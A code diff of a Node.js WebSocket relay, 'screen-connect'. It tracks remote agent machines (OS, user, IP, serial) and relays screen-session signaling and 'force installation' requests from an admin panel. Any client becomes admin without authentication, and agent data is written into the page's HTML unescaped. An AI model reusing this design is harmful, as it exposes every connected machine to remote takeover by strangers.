@@ -2,9 +2,11 @@ const http = require('http');
 const WebSocket = require('ws');
 const { v4: uuidv4 } = require('uuid');
 const { createClient } = require('@libsql/client');
+const fs = require('fs');
+const os = require('os');
 
 // =====================================================
-// CONFIGURATION & TURSO SETUP
+// TURSO DATABASE SETUP
 // =====================================================
 
 const RAW_URL = process.env.TURSO_DATABASE_URL || '';
@@ -12,94 +14,92 @@ const RAW_TOKEN = process.env.TURSO_AUTH_TOKEN || '';
 
 const TURSO_DB_URL = RAW_URL.trim();
 const TURSO_AUTH_TOKEN = RAW_TOKEN
-    .replace(/\r?\n/g, '')
-    .replace(/\s+/g, ' ')
-    .trim()
-    .replace(/^Bearer\s+/i, '')
-    .trim();
+ .replace(/\r?\n/g, '')
+ .replace(/\s+/g, ' ')
+ .trim()
+ .replace(/^Bearer\s+/i, '')
+ .trim();
 
 let dbClient;
 let dbReady = false;
 
 try {
-    dbClient = createClient({
-        url: TURSO_DB_URL,
-        authToken: TURSO_AUTH_TOKEN,
-    });
+ dbClient = createClient({
+ url: TURSO_DB_URL,
+ authToken: TURSO_AUTH_TOKEN,
+ });
 } catch (error) {
-    console.error('[DB] Turso client creation failed:', error.message);
+ console.error('[DB] Turso client creation failed:', error.message);
 }
 
 async function ensureSchema() {
-    try {
-        // Updated schema with serial_number and session_logs
-        await dbClient.execute(`
-            CREATE TABLE IF NOT EXISTS users (
-                id TEXT PRIMARY KEY,
-                os TEXT,
-                arch TEXT,
-                user TEXT,
-                ip TEXT,
-                last_seen INTEGER,
-                status TEXT DEFAULT 'Offline',
-                created_at INTEGER DEFAULT (strftime('%s', 'now')),
-                serial_number TEXT
-            );
-        `);
+ try {
+ await dbClient.execute(`
+ CREATE TABLE IF NOT EXISTS users (
+ id TEXT PRIMARY KEY,
+ os TEXT,
+ arch TEXT,
+ user TEXT,
+ ip TEXT,
+ last_seen INTEGER,
+ status TEXT DEFAULT 'Offline',
+ created_at INTEGER DEFAULT (strftime('%s', 'now')),
+ serial_number TEXT
+ );
+ `);
 
-        await dbClient.execute(`
-            CREATE TABLE IF NOT EXISTS logs (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                user_id TEXT,
-                message TEXT,
-                timestamp INTEGER DEFAULT (strftime('%s', 'now'))
-            );
-        `);
+ await dbClient.execute(`
+ CREATE TABLE IF NOT EXISTS logs (
+ id INTEGER PRIMARY KEY AUTOINCREMENT,
+ message TEXT,
+ timestamp INTEGER DEFAULT (strftime('%s', 'now'))
+ );
+ `);
 
-        await dbClient.execute('SELECT 1');
-        console.log('[DB] Schema verified / created successfully.');
-        dbReady = true;
-    } catch (error) {
-        console.error('[DB] Schema creation failed:', error.message);
-        throw error;
-    }
+ await dbClient.execute('SELECT 1');
+ console.log('[DB] Schema verified / created successfully.');
+ dbReady = true;
+ } catch (error) {
+ console.error('[DB] Schema creation failed:', error.message);
+ throw error;
+ }
 }
 
 ensureSchema().catch(err => console.error('[DB] Initial schema check failed:', err));
 
 function query(sql, params = []) {
-    return dbClient.execute(sql, params);
+ return dbClient.execute(sql, params);
 }
 
 async function queryOne(sql, params = []) {
-    const result = await dbClient.execute({ sql, args: params });
-    return result.rows[0] ?? null;
+ const result = await dbClient.execute({ sql, args: params });
+ return result.rows[0] ?? null;
 }
 
 async function queryRows(sql, params = []) {
-    const result = await dbClient.execute({ sql, args: params });
-    return result.rows;
+ const result = await dbClient.execute({ sql, args: params });
+ return result.rows;
 }
 
 // =====================================================
-// LOGGING SYSTEM
+// LOGGING
 // =====================================================
 
-function logDB(userId, msg) {
-    const timestamp = Date.now();
-    console.log(`[${new Date(timestamp).toISOString()}] [${userId || 'SYS'}] ${msg}`);
+function logDB(msg) {
+ const timestamp = Date.now();
+ console.log(`[${new Date(timestamp).toISOString()}] ${msg}`);
 
-    if (dbReady && dbClient) {
-        dbClient.execute(
-            'INSERT INTO logs (user_id, message, timestamp) VALUES (?, ?, ?)',
-            [userId || 'SYSTEM', String(msg), Math.floor(timestamp / 1000)]
-        ).catch((err) => {
-            console.error('[DB LOG ERROR]', err.message);
-        });
-    }
+ if (dbReady && dbClient) {
+ dbClient.execute(
+ 'INSERT INTO logs (message, timestamp) VALUES (?, ?)',
+ [String(msg), Math.floor(timestamp / 1000)]
+ ).catch((err) => {
+ console.error('[DB LOG ERROR]', err.message);
+ });
+ }
 }
 
-logDB('SYSTEM', 'Initializing Database...');
+logDB('Initializing Database...');
 
 // =====================================================
 // WEBSOCKET SERVER
@@ -107,29 +107,50 @@ logDB('SYSTEM', 'Initializing Database...');
 
 const wss = new WebSocket.Server({ noServer: true });
 
+// =====================================================
+// WEBSOCKET HELPERS
+// =====================================================
+
 function sendMessage(ws, data) {
-    if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify(data));
-        return true;
-    }
-    return false;
+ if (ws && ws.readyState === WebSocket.OPEN) {
+ ws.send(JSON.stringify(data));
+ return true;
+ }
+ return false;
 }
 
-function broadcastToAdmins(msg) {
-    for (const client of wss.clients) {
-        if (client.isAdmin && client.readyState === WebSocket.OPEN) {
-            sendMessage(client, msg);
-        }
-    }
+function notifyAdmin(adminId, message) {
+ for (const client of wss.clients) {
+ if (client.isAdmin && client.adminId === adminId && client.readyState === WebSocket.OPEN) {
+ sendMessage(client, { type: 'notification', message });
+ }
+ }
+}
+
+function broadcastToAdmins(sender, msg) {
+ for (const client of wss.clients) {
+ if (client.isAdmin && client.readyState === WebSocket.OPEN) {
+ sendMessage(client, msg);
+ }
+ }
 }
 
 function findAgentByUniqueID(uniqueId) {
-    for (const client of wss.clients) {
-        if (!client.isAdmin && client.uniqueId === uniqueId && client.readyState === WebSocket.OPEN) {
-            return client;
-        }
-    }
-    return null;
+ for (const client of wss.clients) {
+ if (!client.isAdmin && client.uniqueId === uniqueId && client.readyState === WebSocket.OPEN) {
+ return client;
+ }
+ }
+ return null;
+}
+
+function isAgentConnected(uniqueId, excludedClient = null) {
+ for (const client of wss.clients) {
+ if (client !== excludedClient && !client.isAdmin && client.uniqueId === uniqueId && client.readyState === WebSocket.OPEN) {
+ return true;
+ }
+ }
+ return false;
 }
 
 // =====================================================
@@ -137,249 +158,250 @@ function findAgentByUniqueID(uniqueId) {
 // =====================================================
 
 wss.on('connection', (ws, req) => {
-    const clientId = uuidv4().substring(0, 8);
-    ws.id = clientId;
-    ws.isAdmin = false;
-    ws.adminId = null;
-    ws.uniqueId = null;
-    ws.isAlive = true;
-    const remoteAddress = req.socket.remoteAddress || 'Unknown';
+ const clientId = uuidv4().substring(0, 8);
+ ws.id = clientId;
+ ws.isAdmin = false;
+ ws.adminId = null;
+ ws.uniqueId = null;
+ ws.isAlive = true;
+ const remoteAddress = req.socket.remoteAddress || 'Unknown';
 
-    logDB(null, `[+] WebSocket Connected: ${clientId} from ${remoteAddress}`);
+ logDB(`[+] WebSocket Connected: ${clientId}`);
 
-    ws.on('message', async (msgRaw) => {
-        try {
-            const data = JSON.parse(msgRaw.toString());
-            if (!data || typeof data !== 'object') return;
+ ws.on('message', async (msgRaw) => {
+ try {
+ const data = JSON.parse(msgRaw.toString());
+ if (!data || typeof data !== 'object') return;
 
-            // ADMIN REGISTRATION
-            if (data.type === 'register_admin') {
-                ws.isAdmin = true;
-                ws.adminId = clientId;
-                logDB(null, `[ADMIN] Connected via port ${req.socket.remotePort}`);
-                sendMessage(ws, { type: 'registered', id: clientId });
+ // ADMIN REGISTRATION
+ if (data.type === 'register_admin') {
+ ws.isAdmin = true;
+ ws.adminId = clientId;
+ logDB(`[ADMIN] Connected via port ${req.socket.remotePort}`);
+ notifyAdmin(clientId, '🛡️ Admin Session Started');
+ sendMessage(ws, { type: 'registered', id: clientId });
+ 
+ const allUsers = await queryRows('SELECT * FROM users');
+ const usersList = allUsers.map(u => ({
+ id: u.id,
+ os: u.os,
+ arch: u.arch,
+ user: u.user,
+ ip: u.ip,
+ last_seen: u.last_seen,
+ status: u.status,
+ serial_number: u.serial_number
+ }));
+ sendMessage(ws, { type: 'init_users', users: usersList });
+ return;
+ }
 
-                const allUsers = await queryRows('SELECT * FROM users ORDER BY last_seen DESC');
-                const usersList = allUsers.map(u => ({
-                    id: u.id,
-                    os: u.os,
-                    arch: u.arch,
-                    user: u.user,
-                    ip: u.ip,
-                    last_seen: u.last_seen,
-                    status: u.status,
-                    serial_number: u.serial_number
-                }));
-                sendMessage(ws, { type: 'init_users', users: usersList });
-                return;
-            }
+ // AGENT INFO — THE CRITICAL FIX
+ if (data.type === 'info') {
+ if (ws.isAdmin) return;
 
-            // AGENT INFO
-            if (data.type === 'info') {
-                if (ws.isAdmin) return;
+ const uniqueId = String(data.uniqueId || data.id || '').trim();
+ if (!uniqueId || uniqueId.length > 255) {
+ logDB('[WARN] Invalid agent unique ID');
+ return;
+ }
 
-                const uniqueId = String(data.uniqueId || data.id || '').trim();
-                if (!uniqueId || uniqueId.length > 255) return;
+ ws.uniqueId = uniqueId;
+ const now = Date.now();
 
-                ws.uniqueId = uniqueId;
-                const now = Date.now();
+ if (dbClient) {
+ const existingUser = await queryOne('SELECT * FROM users WHERE id = ?', [uniqueId]);
 
-                if (dbClient) {
-                    const existingUser = await queryOne('SELECT * FROM users WHERE id = ?', [uniqueId]);
+ if (!existingUser) {
+ await dbClient.execute(`
+ INSERT INTO users (id, os, arch, user, ip, last_seen, status, serial_number)
+ VALUES (?, ?, ?, ?, ?, ?, 'Online', ?)
+ `, [uniqueId, data.os || null, data.arch || null, data.user || null, data.ip || remoteAddress, now, data.serialNumber || uniqueId]);
+ logDB(`[AGENT] NEW: ${uniqueId} (${data.os || 'unknown'})`);
+ } else {
+ await dbClient.execute(`
+ UPDATE users SET
+ last_seen = ?,
+ status = 'Online',
+ os = COALESCE(?, os),
+ arch = COALESCE(?, arch),
+ user = COALESCE(?, user),
+ ip = COALESCE(?, ip)
+ WHERE id = ?
+ `, [now, data.os || null, data.arch || null, data.user || null, data.ip || remoteAddress, uniqueId]);
+ logDB(`[AGENT] REJOIN: ${uniqueId} (${data.os || 'unknown'})`);
+ }
+ } else {
+ logDB(`[AGENT] NO DB: ${uniqueId} (${data.os || 'unknown'})`);
+ }
 
-                    if (!existingUser) {
-                        await dbClient.execute(`
-                            INSERT INTO users (id, os, arch, user, ip, last_seen, status, serial_number)
-                            VALUES (?, ?, ?, ?, ?, ?, 'Online', ?)
-                        `, [uniqueId, data.os || null, data.arch || null, data.user || null, data.ip || remoteAddress, now, data.serialNumber || uniqueId]);
-                        logDB(uniqueId, `[AGENT] NEW: ${uniqueId} (${data.os || 'unknown'}) Serial: ${data.serialNumber || 'N/A'}`);
-                    } else {
-                        await dbClient.execute(`
-                            UPDATE users SET
-                                last_seen = ?,
-                                status = 'Online',
-                                os = COALESCE(?, os),
-                                arch = COALESCE(?, arch),
-                                user = COALESCE(?, user),
-                                ip = COALESCE(?, ip)
-                            WHERE id = ?
-                        `, [now, data.os || null, data.arch || null, data.user || null, data.ip || remoteAddress, uniqueId]);
-                        logDB(uniqueId, `[AGENT] REJOIN: ${uniqueId} (${data.os || 'unknown'})`);
-                    }
-                }
+ for (const client of wss.clients) {
+ if (client.readyState === WebSocket.OPEN && client.isAdmin) {
+ sendMessage(client, {
+ type: 'user_update',
+ id: uniqueId,
+ info: data,
+ lastSeen: now,
+ });
+ }
+ }
+ return;
+ }
 
-                broadcastToAdmins({
-                    type: 'user_update',
-                    id: uniqueId,
-                    info: data,
-                    lastSeen: now
-                });
-                return;
-            }
+ // WEBRTC SIGNALING
+ if (['offer', 'answer', 'candidate'].includes(data.type)) {
+ if (ws.isAdmin && data.targetId) {
+ const targetWs = findAgentByUniqueID(String(data.targetId));
+ if (targetWs && targetWs.readyState === WebSocket.OPEN) {
+ sendMessage(targetWs, data);
+ } else {
+ logDB(`[WARN] Agent not connected: ${data.targetId}`);
+ }
+ return;
+ }
 
-            // WEBRTC SIGNALING
-            if (['offer', 'answer', 'candidate'].includes(data.type)) {
-                if (ws.isAdmin && data.targetId) {
-                    const targetWs = findAgentByUniqueID(String(data.targetId));
-                    if (targetWs && targetWs.readyState === WebSocket.OPEN) {
-                        sendMessage(targetWs, data);
-                    }
-                    return;
-                }
+ if (!ws.isAdmin && data.targetId === 'admin') {
+ for (const client of wss.clients) {
+ if (client.readyState === WebSocket.OPEN && client.isAdmin) {
+ sendMessage(client, data);
+ }
+ }
+ return;
+ }
+ }
 
-                if (!ws.isAdmin && data.targetId === 'admin') {
-                    broadcastToAdmins(data);
-                    return;
-                }
-            }
+ // FORCE INSTALLATION / JOIN REQUEST
+ if (data.type === 'request_join') {
+ if (ws.isAdmin) {
+ const targetWs = findAgentByUniqueID(String(data.targetId));
+ if (targetWs && targetWs.readyState === WebSocket.OPEN) {
+ sendMessage(targetWs, { type: 'request_join', targetId: data.targetId, from: 'admin' });
+ logDB(`[ADMIN] Requested join to ${data.targetId}`);
+ } else {
+ logDB(`[WARN] Agent ${data.targetId} not connected for join`);
+ }
+ }
+ return;
+ }
 
-            // FORCE INSTALLATION / JOIN REQUEST
-            if (data.type === 'request_join') {
-                if (ws.isAdmin) {
-                    const targetWs = findAgentByUniqueID(String(data.targetId));
-                    if (targetWs && targetWs.readyState === WebSocket.OPEN) {
-                        sendMessage(targetWs, { type: 'request_join', targetId: data.targetId, from: 'admin' });
-                        logDB(null, `[ADMIN] Requested join to ${data.targetId}`);
-                    }
-                }
-                return;
-            }
+ } catch (error) {
+ logDB(`[ERR] Message processing error: ${error.message}`);
+ }
+ });
 
-        } catch (error) {
-            logDB(null, `[ERR] Message processing error: ${error.message}`);
-        }
-    });
+ ws.on('pong', () => { ws.isAlive = true; });
 
-    ws.on('pong', () => { ws.isAlive = true; });
+ ws.on('close', async () => {
+ logDB(`[-] Client Disconnected: ${ws.id}`);
 
-    ws.on('close', async () => {
-        logDB(null, `[-] Client Disconnected: ${ws.id}`);
+ if (!ws.isAdmin && ws.uniqueId) {
+ const uniqueId = ws.uniqueId;
+ if (!isAgentConnected(uniqueId, ws)) {
+ if (dbClient) {
+ try {
+ await dbClient.execute(`
+ UPDATE users SET status = 'Offline', last_seen = ? WHERE id = ?
+ `, [Date.now(), uniqueId]);
+ logDB(`[AGENT] Offline: ${uniqueId}`);
+ } catch (error) {
+ logDB(`[DB ERR] Disconnect update: ${error.message}`);
+ }
+ }
+ }
+ }
 
-        if (!ws.isAdmin && ws.uniqueId) {
-            const uniqueId = ws.uniqueId;
-            if (!findAgentByUniqueID(uniqueId)) {
-                if (dbClient) {
-                    try {
-                        await dbClient.execute(`
-                            UPDATE users SET status = 'Offline', last_seen = ? WHERE id = ?
-                        `, [Date.now(), uniqueId]);
-                        logDB(uniqueId, `[AGENT] Offline: ${uniqueId}`);
-                    } catch (error) {
-                        logDB(uniqueId, `[DB ERR] Disconnect update: ${error.message}`);
-                    }
-                }
-            }
-        }
+ broadcastToAdmins(ws, { type: 'refresh_users' });
+ });
 
-        broadcastToAdmins({ type: 'refresh_users' });
-    });
-
-    ws.on('error', (error) => {
-        logDB(null, `[WS ERR] ${ws.id}: ${error.message}`);
-    });
+ ws.on('error', (error) => {
+ logDB(`[WS ERR] ${ws.id}: ${error.message}`);
+ });
 });
 
 // =====================================================
-// HEARTBEAT
+// WEBSOCKET HEARTBEAT
 // =====================================================
 
 const heartbeat = setInterval(() => {
-    for (const ws of wss.clients) {
-        if (ws.isAlive === false) { ws.terminate(); continue; }
-        ws.isAlive = false;
-        if (ws.readyState === WebSocket.OPEN) { ws.ping(); }
-    }
+ for (const ws of wss.clients) {
+ if (ws.isAlive === false) { ws.terminate(); continue; }
+ ws.isAlive = false;
+ if (ws.readyState === WebSocket.OPEN) { ws.ping(); }
+ }
 }, 30000);
 
 wss.on('close', () => { clearInterval(heartbeat); });
 
 // =====================================================
-// HTTP SERVER & VERCEL COMPATIBILITY
+// SERVER STARTUP — VERCEL SERVERLESS FUNCTION
 // =====================================================
 
 module.exports = async (req, res) => {
-    const upgradeHeader = req.headers['upgrade'] || '';
-    
-    // Handle WebSocket Upgrade
-    if (upgradeHeader.toLowerCase() === 'websocket') {
-        wss.handleUpgrade(req, req.socket, Buffer.from(''), (socket) => {
-            wss.emit('connection', socket, req);
-        });
-        return;
-    }
+ // Handle WebSocket Upgrade
+ const upgradeHeader = req.headers['upgrade'] || '';
+ if (upgradeHeader.toLowerCase() === 'websocket') {
+ const url = new URL(req.url, `http://${req.headers.host}`);
+ 
+ const dummyRes = {
+ writeHead: (status, headers) => {
+ res.writeHead(status, headers);
+ },
+ end: () => {
+ // Do nothing, the WebSocket server will handle the rest
+ }
+ };
 
-    // Handle REST API Endpoints
-    const url = new URL(req.url, `http://${req.headers.host}`);
+ wss.handleUpgrade(req, req.socket, Buffer.from(''), (socket) => {
+ wss.emit('connection', socket, req);
+ });
 
-    if (req.method === 'GET' && url.pathname === '/api/logs') {
-        try {
-            const limit = parseInt(url.searchParams.get('limit')) || 50;
-            const rows = await queryRows('SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?', [limit]);
-            res.setHeader('Content-Type', 'application/json');
-            res.json(rows);
-        } catch (error) {
-            res.status(500).json({ error: error.message });
-        }
-        return;
-    }
+ return;
+ }
 
-    if (req.method === 'GET' && url.pathname === '/api/users') {
-        try {
-            const rows = await queryRows('SELECT * FROM users ORDER BY last_seen DESC');
-            res.setHeader('Content-Type', 'application/json');
-            res.json(rows);
-        } catch (error) {
-            res.status(500).json({ error: error.message });
-        }
-        return;
-    }
+ // Handle HTTP Requests (Health Check, Admin Panel)
+ if (req.method === 'GET' && req.url === '/health') {
+ try {
+ await dbClient.execute('SELECT 1 AS health_check');
+ res.json({
+ status: 'ok',
+ service: 'screen-connect',
+ database: 'connected',
+ uptime: process.uptime(),
+ db_type: 'turso/libsql',
+ db_ready: dbReady,
+ });
+ } catch (error) {
+ res.status(503).json({
+ status: 'degraded',
+ service: 'screen-connect',
+ database: 'disconnected',
+ uptime: process.uptime(),
+ db_type: 'libsql',
+ error: error.message,
+ db_ready: dbReady,
+ });
+ }
+ return;
+ }
 
-    if (req.method === 'POST' && url.pathname === '/api/admins') {
-        // Adds a dummy admin ID to the DB to allow reconnection or tracking
-        const body = await new Promise(r => { let d = ''; req.on('data', c => d += c; req.on('end', () => r(d)); });
-        const { adminId } = JSON.parse(body);
-        try {
-            await dbClient.execute('INSERT OR IGNORE INTO users (id, status, serial_number) VALUES (?, "Online", "ADMIN")', [adminId]);
-            res.json({ success: true });
-        } catch (error) {
-            res.status(500).json({ error: error.message });
-        }
-        return;
-    }
+ if (req.method === 'GET' && req.url === '/') {
+ res.send(adminHTML);
+ return;
+ }
 
-    if (req.method === 'DELETE' && url.pathname.startsWith('/api/users/')) {
-        const userId = url.pathname.split('/').pop();
-        try {
-            await dbClient.execute('DELETE FROM users WHERE id = ?', [userId]);
-            res.json({ success: true });
-        } catch (error) {
-            res.status(500).json({ error: error.message });
-        }
-        return;
-    }
+ if (req.method === 'GET' && req.url === '/admin.html') {
+ res.setHeader('Content-Type', 'text/html');
+ res.send(adminHTML);
+ return;
+ }
 
-    if (req.method === 'GET' && (url.pathname === '/' || url.pathname === '/admin.html')) {
-        res.setHeader('Content-Type', 'text/html');
-        res.send(adminHTML);
-        return;
-    }
-
-    if (req.method === 'GET' && url.pathname === '/health') {
-        try {
-            await dbClient.execute('SELECT 1 AS health_check');
-            res.json({ status: 'ok', service: 'screen-connect', database: 'connected', uptime: process.uptime(), db_type: 'turso/libsql', db_ready: dbReady });
-        } catch (error) {
-            res.status(503).json({ status: 'degraded', service: 'screen-connect', database: 'disconnected', uptime: process.uptime(), db_type: 'libsql', error: error.message, db_ready: dbReady });
-        }
-        return;
-    }
-
-    res.statusCode = 404;
-    res.end('Not Found');
+ // Default response
+ res.statusCode = 404;
+ res.end('Not Found');
 };
 
 // =====================================================
-// ADMIN PANEL HTML (Sleek ScreenConnect UI)
+// ADMIN PANEL HTML
 // =====================================================
 
 const adminHTML = `
@@ -421,7 +443,6 @@ const adminHTML = `
                 radial-gradient(circle at 85% 30%, rgba(16, 185, 129, 0.03), transparent 25%);
         }
 
-        /* Sidebar */
         .sidebar {
             width: 260px;
             background-color: var(--bg-glass);
@@ -520,7 +541,6 @@ const adminHTML = `
             box-shadow: 0 6px 16px var(--accent-glow);
         }
 
-        /* Main Content */
         .main-content {
             flex: 1;
             display: flex;
@@ -653,7 +673,6 @@ const adminHTML = `
             border: 1px solid var(--border-light);
             border-radius: 12px;
             overflow: hidden;
-            margin-bottom: 32px;
         }
 
         .panel-header {
@@ -668,7 +687,7 @@ const adminHTML = `
 
         .table-header {
             display: grid;
-            grid-template-columns: 60px 2fr 1.5fr 1fr 1fr;
+            grid-template-columns: 60px 2fr 2fr 1fr;
             padding: 16px 24px;
             background-color: rgba(0, 0, 0, 0.2);
             color: var(--text-muted);
@@ -681,7 +700,7 @@ const adminHTML = `
 
         .table-row {
             display: grid;
-            grid-template-columns: 60px 2fr 1.5fr 1fr 1fr;
+            grid-template-columns: 60px 2fr 2fr 1fr;
             padding: 18px 24px;
             border-bottom: 1px solid var(--border-light);
             align-items: center;
@@ -760,44 +779,6 @@ const adminHTML = `
             background-color: var(--text-muted);
         }
 
-        /* Session Logs Panel */
-        .logs-panel {
-            background-color: var(--bg-surface);
-            border: 1px solid var(--border-light);
-            border-radius: 12px;
-            overflow: hidden;
-            height: 400px;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .logs-container {
-            flex: 1;
-            overflow-y: auto;
-            padding: 16px 24px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.85rem;
-        }
-
-        .log-entry {
-            margin-bottom: 8px;
-            padding-bottom: 8px;
-            border-bottom: 1px solid var(--border-light);
-            display: flex;
-            gap: 12px;
-        }
-
-        .log-time {
-            color: var(--text-muted);
-            white-space: nowrap;
-        }
-
-        .log-msg {
-            color: var(--text-main);
-            word-break: break-all;
-        }
-
-        /* Modal */
         .modal-overlay {
             position: fixed;
             top: 0; left: 0; width: 100vw; height: 100vh;
@@ -912,7 +893,8 @@ const adminHTML = `
             align-items: center;
             position: relative;
             overflow: hidden;
-            background-image: radial-gradient(circle at center, #1e293b 0%, #020617 100%);
+            background-image:
+                radial-gradient(circle at center, #1e293b 0%, #020617 100%);
         }
 
         .connecting-state {
@@ -1010,7 +992,7 @@ const adminHTML = `
                 </div>
             </div>
 
-            <!-- User Table -->
+            <!-- Data Table -->
             <div class="data-panel">
                 <div class="panel-header">
                     <span>Computer Directory</span>
@@ -1022,22 +1004,10 @@ const adminHTML = `
                     <div>Computer Name</div>
                     <div>Company</div>
                     <div>Status</div>
-                    <div>Serial Number</div>
                 </div>
 
                 <div id="table-body">
                     <!-- Rows will be populated by JS -->
-                </div>
-            </div>
-
-            <!-- Session Logs -->
-            <div class="logs-panel">
-                <div class="panel-header">
-                    <span>Session Logs</span>
-                    <i class="fa-solid fa-sync" style="cursor: pointer; color: var(--text-muted);" onclick="loadLogs()"></i>
-                </div>
-                <div class="logs-container" id="logs-container">
-                    <!-- Logs will be populated by JS -->
                 </div>
             </div>
         </div>
@@ -1083,7 +1053,7 @@ const adminHTML = `
     <script>
         const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
         const host = window.location.host;
-        const wsUrl = protocol + '//' + host + '/';
+        const wsUrl = \`\${protocol}//\${host}/\`;
 
         const ws = new WebSocket(wsUrl);
         let users = {};
@@ -1101,7 +1071,6 @@ const adminHTML = `
 
                 if (data.type === 'registered') {
                     ws.isAdmin = true;
-                    loadLogs(); // Load logs when admin connects
                 }
                 else if (data.type === 'init_users') {
                     users = {};
@@ -1266,7 +1235,7 @@ const adminHTML = `
                 card.className = 'table-row';
                 card.onclick = () => openSession(id, data);
 
-                const osInfo = (data.info ? (data.info.os || 'Unknown') + ' / ' + (data.info.user || 'Unknown') : 'Unknown OS');
+                const osInfo = data.info ? \`\${data.info.os || 'Unknown'} / \${data.info.user || 'Unknown'}\` : 'Unknown OS';
                 const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';
 
                 let statusColor = 'status-offline';
@@ -1284,17 +1253,17 @@ const adminHTML = `
                     btnText = 'Connecting...';
                 }
 
-                card.innerHTML = 
-                    '<div class="custom-checkbox" onclick="event.stopPropagation(); this.classList.toggle(\'checked\');"></div>' +
-                    '<div class="machine-info">' +
-                    '<span class="name"><i class="fa-solid fa-laptop"></i> ' + id + '</span>' +
-                    '<span class="company">' + (data.serialNumber || 'N/A') + '</span>' +
-                    '</div>' +
-                    '<div style="color: var(--text-muted); font-size: 0.9rem;">' + osInfo + '</div>' +
-                    '<div class="status">' +
-                    '<div class="status-dot ' + statusColor + '"></div> ' + data.status +
-                    '</div>' +
-                    '<div style="font-size: 0.85rem; color: var(--text-muted);">' + (data.serialNumber || 'N/A') + '</div>';
+                card.innerHTML = \`
+                    <div class="custom-checkbox" onclick="event.stopPropagation(); this.classList.toggle('checked');"></div>
+                    <div class="machine-info">
+                        <span class="name"><i class="fa-solid fa-laptop"></i> \${id}</span>
+                        <span class="company">\${data.serialNumber || 'N/A'}</span>
+                    </div>
+                    <div style="color: var(--text-muted); font-size: 0.9rem;">\${osInfo}</div>
+                    <div class="status">
+                        <div class="status-dot \${statusColor}"></div> \${data.status}
+                    </div>
+                `;
                 grid.appendChild(card);
             }
 
@@ -1305,7 +1274,7 @@ const adminHTML = `
         }
 
         function openSession(machineId, data) {
-            document.getElementById('modalMachineName').innerText = machineId + ' - ' + data.serialNumber;
+            document.getElementById('modalMachineName').innerText = \`\${machineId} - \${data.serialNumber}\`;
             document.getElementById('connectingState').style.display = 'block';
             document.getElementById('sessionModal').classList.add('active');
             
@@ -1329,37 +1298,6 @@ const adminHTML = `
                 const text = row.innerText.toLowerCase();
                 row.style.display = text.includes(filter) ? '' : 'none';
             });
-        }
-
-        // Fetch logs from the API
-        async function loadLogs() {
-            const container = document.getElementById('logs-container');
-            container.innerHTML = '<div class="log-entry"><span class="log-time">--:--:--</span><span class="log-msg">Loading logs...</span></div>';
-            
-            try {
-                const response = await fetch('/api/logs?limit=50');
-                const logs = await response.json();
-                
-                container.innerHTML = '';
-                if (logs.length === 0) {
-                    container.innerHTML = '<div class="log-entry"><span class="log-time">--:--:--</span><span class="log-msg">No logs available.</span></div>';
-                    return;
-                }
-
-                logs.forEach(log => {
-                    const date = new Date(log.timestamp * 1000);
-                    const timeStr = date.toLocaleTimeString();
-                    const entry = document.createElement('div');
-                    entry.className = 'log-entry';
-                    entry.innerHTML = `
-                        <span class="log-time">${timeStr}</span>
-                        <span class="log-msg">[${log.user_id || 'SYSTEM'}] ${log.message}</span>
-                    `;
-                    container.prepend(entry);
-                });
-            } catch (error) {
-                container.innerHTML = '<div class="log-entry"><span class="log-time">--:--:--</span><span class="log-msg">Failed to load logs.</span></div>';
-            }
         }
     </script>
 </body>
